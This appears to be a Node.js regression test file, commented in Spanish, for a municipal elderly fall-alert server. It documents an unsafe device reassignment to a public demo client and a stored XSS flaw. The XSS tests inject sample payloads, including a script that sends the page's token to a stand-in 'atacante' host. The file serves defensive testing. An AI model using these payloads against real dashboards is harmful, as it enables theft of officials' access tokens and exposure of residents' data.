'use strict';

// ─────────────────────────────────────────────────────────────────────────────
// Tests que documentan BUGS ABIERTOS
//
// Cada bug tiene dos tests:
//   1. Un test `skip` que expresa el comportamiento CORRECTO. Hoy falla. Cuando
//      el bug se corrija (con aprobación explícita del usuario), basta quitar
//      el `.skip` y debe pasar.
//   2. Un test activo que fija el comportamiento ACTUAL, para que la suite
//      completa pase y para que cualquier cambio accidental sea visible.
//
// No se corrige el sistema desde acá: la corrección de S03 y S04 requiere
// decisión del usuario. Ver docs/INFORME_TESTING.md, sección "Bugs abiertos".
// ─────────────────────────────────────────────────────────────────────────────

const { test, describe, after } = require('node:test');
const assert = require('node:assert/strict');
const {
  iniciarServidor, payloadTraccar, postWebhook, getJson, hashDe,
  crearCliente, asignarDispositivo,
} = require('./ayuda/servidor');

// ─────────────────────────────────────────────────────────────────────────────
// S04 — Reasignación automática de dispositivos al cliente `demo` en cada arranque
// Severidad: Crítico · docs/INFORME_SEGURIDAD.md S04 · docs/INFORME_ARQUITECTURA.md H09
//
// El bloque `INSERT OR IGNORE INTO device_clients SELECT DISTINCT device_hash,
// 'demo' FROM events` corre en CADA arranque, no una sola vez. Un dispositivo
// nuevo de un municipio real (llega por webhook, todavía sin asignar en el
// panel admin que no existe) queda como propiedad de `demo` en el próximo
// `pm2 restart`. El token de demo es público. Además, el municipio DEJA DE VER
// a esa persona en su dashboard.
// ─────────────────────────────────────────────────────────────────────────────

describe('S04 — reasignación al cliente demo en cada arranque', () => {
  const TOKEN_MAIPU = 'token-maipu-real';
  const hAsignado = hashDe('maipu-ya-asignado');
  const hNuevo = hashDe('maipu-recien-entregado');
  let s;

  after(async () => { if (s) await s.cerrar(); });

  /** Municipio real operando + un dispositivo nuevo que aún no fue asignado. */
  async function escenarioMunicipioReal() {
    s = await iniciarServidor();
    crearCliente(s.db, 'maipu', 'Municipalidad de Maipú', TOKEN_MAIPU);
    asignarDispositivo(s.db, hAsignado, 'maipu');
    // El dispositivo ya asignado reporta normalmente.
    await postWebhook(s.url, payloadTraccar({ deviceId: 'maipu-ya-asignado', alarm: 'fall' }));
    // Llega un dispositivo de reposición: entra a `events`, no a `device_clients`.
    await postWebhook(s.url, payloadTraccar({ deviceId: 'maipu-recien-entregado', alarm: 'fall' }));
    return s;
  }

  async function reiniciar() {
    const dir = s.dir;
    await s.cerrar({ borrarDir: false });
    s = await iniciarServidor({ dir });
    return s;
  }

  test('antes del reinicio, el dispositivo nuevo no pertenece a nadie', async () => {
    await escenarioMunicipioReal();
    const fila = s.db.prepare('SELECT client_id FROM device_clients WHERE device_hash = ?').get(hNuevo);
    assert.equal(fila, undefined, 'queda pendiente de asignación, como corresponde');
  });

  test('el dispositivo YA asignado sobrevive al reinicio (INSERT OR IGNORE lo respeta)', async () => {
    await reiniciar();
    const fila = s.db.prepare('SELECT client_id FROM device_clients WHERE device_hash = ?').get(hAsignado);
    assert.equal(fila.client_id, 'maipu', 'una asignación explícita no debe perderse en un reinicio');
  });

  // ── BUG ABIERTO ────────────────────────────────────────────────────────────
  test.skip('BUG ABIERTO S04: un reinicio NO debe entregarle a demo un dispositivo sin asignar', () => {
    // Quitar el `.skip` cuando se aplique la remediación de S04 (migración única,
    // condicionada a que device_clients esté vacía). Hoy este assert falla:
    // el dispositivo nuevo de Maipú termina siendo de `demo`.
    const fila = s.db.prepare('SELECT client_id FROM device_clients WHERE device_hash = ?').get(hNuevo);
    assert.notEqual(fila?.client_id, 'demo',
      'un dispositivo de un municipio real no puede caer en el cliente demo por un reinicio');
  });

  test.skip('BUG ABIERTO S04: el municipio debe seguir viendo a esa persona tras el reinicio', async () => {
    // Consecuencia asistencial del mismo bug: un adulto mayor con caídas
    // desaparece del panel de seguimiento del municipio.
    const { cuerpo } = await getJson(s.url, `/events?token=${TOKEN_MAIPU}`);
    assert.ok(cuerpo.some(e => e.device_hash === hNuevo),
      'el dispositivo nuevo debe ser visible para Maipú, no para demo');
  });

  // ── Comportamiento actual (fija el bug para detectar cambios) ──────────────
  test('COMPORTAMIENTO ACTUAL (defectuoso): tras el reinicio el dispositivo nuevo es de demo', () => {
    const fila = s.db.prepare('SELECT client_id FROM device_clients WHERE device_hash = ?').get(hNuevo);
    assert.equal(fila?.client_id, 'demo',
      'si este assert empieza a fallar, S04 fue corregido: quitar los .skip de arriba');
  });

  test('COMPORTAMIENTO ACTUAL (defectuoso): el token público demo ve datos de un municipio real', async () => {
    const { cuerpo } = await getJson(s.url, '/events?token=demo-token-dev-only');
    assert.ok(cuerpo.some(e => e.device_hash === hNuevo),
      'demo-token-dev-only está publicado en el repositorio (S08)');
    const maipu = await getJson(s.url, `/events?token=${TOKEN_MAIPU}`);
    assert.ok(!maipu.cuerpo.some(e => e.device_hash === hNuevo),
      'y Maipú perdió visibilidad sobre esa persona');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// S03 — XSS almacenado vía /webhook sin autenticar
// Severidad: Crítico · docs/INFORME_SEGURIDAD.md S03
//
// `attributes.alarm` no pasa por lista blanca: normalizeAlarm() solo cambia
// mayúsculas por guion bajo y baja a minúsculas, conservando `<`, `>`, `=` y
// comillas. El dashboard lo renderiza con innerHTML sin escapar
// (server/dashboard.html) y el token del municipio vive en la URL: el payload
// almacenado roba el token del funcionario que abre el dashboard.
// ─────────────────────────────────────────────────────────────────────────────

describe('S03 — XSS almacenado a través de alarm_type', () => {
  const TOKEN = 'token-victima';
  let s;

  const payloadsMaliciosos = [
    '<script>fetch("http://atacante/"+location.search)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert('xss')",
    '<iframe src="http://atacante"></iframe>',
  ];

  test('preparación: se inyectan payloads por el webhook sin credenciales', async () => {
    s = await iniciarServidor();
    crearCliente(s.db, 'victima', 'Municipio Víctima', TOKEN);
    for (const [i, p] of payloadsMaliciosos.entries()) {
      const id = `xss-${i}`;
      const r = await postWebhook(s.url, payloadTraccar({ deviceId: id, alarm: p }));
      assert.equal(r.status, 200, 'el webhook acepta cualquier cosa (S06)');
      asignarDispositivo(s.db, hashDe(id), 'victima');
    }
  });

  after(async () => { if (s) await s.cerrar(); });

  // ── BUG ABIERTO ────────────────────────────────────────────────────────────
  test.skip('BUG ABIERTO S03: un alarm_type con HTML/JS no debe almacenarse', () => {
    // Quitar el `.skip` al aplicar la remediación 1 de S03 (lista blanca
    // ALARMAS_VALIDAS en normalizeAlarm: lo desconocido se descarta).
    const filas = s.db.prepare('SELECT alarm_type FROM events WHERE alarm_type IS NOT NULL').all();
    for (const f of filas) {
      assert.doesNotMatch(f.alarm_type, /[<>"'=]/,
        `se almacenó contenido peligroso: ${f.alarm_type}`);
    }
  });

  test.skip('BUG ABIERTO S03: solo deben persistirse tipos de alarma de la lista blanca', () => {
    const VALIDAS = new Set(['sos', 'fall', 'low_battery', 'power_off', 'power_on', 'geofence_enter', 'geofence_exit']);
    const distintos = s.db.prepare('SELECT DISTINCT alarm_type FROM events WHERE alarm_type IS NOT NULL').all();
    for (const { alarm_type } of distintos) {
      assert.ok(VALIDAS.has(alarm_type), `tipo de alarma no reconocido en la base: ${alarm_type}`);
    }
  });

  test.skip('BUG ABIERTO S03: la API no debe devolver al dashboard un alarm_type con etiquetas HTML', async () => {
    const { texto } = await getJson(s.url, `/events?token=${TOKEN}`);
    assert.ok(!texto.includes('<script'), 'la respuesta alimenta un innerHTML sin escapar');
  });

  // ── Comportamiento actual ──────────────────────────────────────────────────
  test('COMPORTAMIENTO ACTUAL (vulnerable): el payload se almacena en minúsculas y entero', () => {
    const fila = s.db.prepare("SELECT alarm_type FROM events WHERE alarm_type LIKE '<script%'").get();
    assert.ok(fila, 'si este assert empieza a fallar, S03 fue corregido: quitar los .skip de arriba');
    assert.ok(fila.alarm_type.includes('fetch('), 'normalizeAlarm no filtra caracteres');
  });

  test('COMPORTAMIENTO ACTUAL (vulnerable): /events devuelve el payload al dashboard', async () => {
    const { texto } = await getJson(s.url, `/events?token=${TOKEN}`);
    assert.ok(texto.includes('<script'), 'y dashboard.html lo inserta con innerHTML sin escapar');
  });

  test('el payload almacenado NO rompe el resto de la API (los endpoints siguen respondiendo)', async () => {
    for (const ruta of ['/summary', '/stats', '/heatmap', '/riesgo', '/utilization', '/export']) {
      const { status } = await getJson(s.url, `${ruta}?token=${TOKEN}`);
      assert.equal(status, 200, `${ruta} debe seguir funcionando pese a los datos envenenados`);
    }
  });

  test('el payload malicioso no contamina los KPI (no coincide con sos/fall/low_battery)', async () => {
    const { cuerpo } = await getJson(s.url, `/summary?token=${TOKEN}`);
    assert.equal(cuerpo.sos, 0);
    assert.equal(cuerpo.fall, 0);
    assert.equal(cuerpo.low_battery, 0);
    assert.equal(cuerpo.total, payloadsMaliciosos.length,
      'pero sí infla el contador "total" de alertas (S06: eventos falsos)');
  });
});
